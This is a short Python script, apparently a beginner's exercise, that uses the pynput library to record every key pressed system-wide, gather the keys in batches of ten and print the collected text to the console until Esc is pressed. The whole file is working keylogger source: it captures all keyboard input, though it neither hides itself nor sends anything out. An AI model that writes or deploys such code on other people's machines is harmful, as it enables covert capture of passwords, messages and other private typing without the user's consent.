import pynput
from pynput.keyboard import Key,Listener

cont = 0
texto =""
flavio = []

def keylogger(key):
    global flavio,cont
    flavio.append(format(key))
    cont+=1
    if cont>=10:
        cont=0
        retonar(flavio)
        flavio=[]
def retonar(nuevo):
    global texto
    for i in nuevo:
        texto += i
    print(texto)

def escapar(key):
    if key == Key.esc:
        return False

with Listener(on_press=keylogger,on_release=escapar) as Listener:
    Listener.join()